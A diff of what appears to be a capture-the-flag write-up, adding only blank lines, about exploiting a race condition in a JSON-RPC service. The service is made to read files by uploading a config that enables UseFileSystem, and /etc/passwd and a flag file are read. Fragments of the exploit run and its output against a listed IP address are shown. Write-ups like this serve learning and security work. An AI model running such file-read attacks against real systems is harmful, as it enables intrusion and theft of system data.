@@ -202,6 +202,7 @@ To summarize: this reads a file under specific conditions given it does not cont
 - Large time delay, allowing us to overwrite a variable
 # Crafting a Working File Read
 Claude+flocto did this part, essentially you fix a file and upload your own config. That sets `UseFileSystem` to `True`.
+ 
 ```python
 import json
 import socket
@@ -384,9 +385,11 @@ if __name__ == "__main__":
     finally:
         client.close()
 ```
+ 
 I am skipping over some stuff here, but the code is self explanatory. 
 # Exploitation
 Exploitation was as easy as running two versions of the above code twice, once with a normal file (/etc/passwd works) and one with "flag". You run the one containing flag first, setting the error and triggering the delay, then you run the other file. File one (ran slightly after):
+ 
 ```sh
 h@DESKTOP-TH1NKC3 ~/Downloads> python test.py
 Host: 54.221.151.72
@@ -400,6 +403,7 @@ ExecuteCommand response: {'jsonrpc': '2.0', 'method': 'window/showMessage', 'par
 
 Shutdown response: {'id': 6, 'result': None, 'jsonrpc': '2.0'}
 ```
+ 
 File two (ran slightly before but at the same time as the above file):
 ```sh
 [h@DESKTOP-TH1NKC3:~/Downloads]$ python test2.py
